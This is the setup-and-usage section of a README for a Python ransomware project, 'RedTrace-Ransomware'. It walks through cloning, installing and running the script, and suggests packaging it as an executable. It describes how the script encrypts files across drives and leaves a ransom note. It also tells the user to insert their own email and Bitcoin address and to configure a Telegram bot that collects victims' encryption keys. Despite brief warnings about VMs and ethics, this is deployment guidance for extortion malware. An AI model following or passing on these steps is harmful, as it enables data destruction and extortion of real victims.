## üõ†Ô∏è Setup and Usage

### Prerequisites

- Python 3.7 or higher
- Required Python libraries (see `requirements.txt`)

### Steps

1. **Clone the repository**
   ```bash
   git clone https://github.com/HectorsGrav3/RedTrace-Ransomware.git
   ```

2. **Navigate to the project directory**
   ```bash
   cd RedTrace-Ransomware
   ```

3. **Install dependencies**
   Install the required Python libraries listed in the `requirements.txt` file:
   ```bash
   pip install -r requirements.txt
   ```

4. **Run the script**
   Use the following command to run the ransomware script:
   ```bash
   python redtrace.py
   ```
   (you could use pyinstaller to make it an exe if needed)

5. **Testing environment**
   - Ensure you run this script in an isolated or virtualized environment (e.g., a virtual machine) to avoid unintended consequences.
   - Do **not** run this script on a system containing sensitive or important data.

6. **Outputs**
   - The script will scan the specified drives and encrypt files with defined extensions.
   - It will create a `README.txt` file on the desktop with instructions and a unique ID.
   - The desktop wallpaper will be changed as part of the demonstration.

### Note

- Also change the fields **your email** and **Bitcoin Adress** fiels in the code.
- Also please note that you will need to add the image link to the code for the wallpaper that you will need to upload somewhere. (the image is in the repository)
- The script sends encryption keys and unique IDs to a specified Telegram bot. Ensure that you configure the `bot_token` and `chat_ids` in the script if you wish to use this feature.
- Be aware of ethical and legal considerations before running this script.
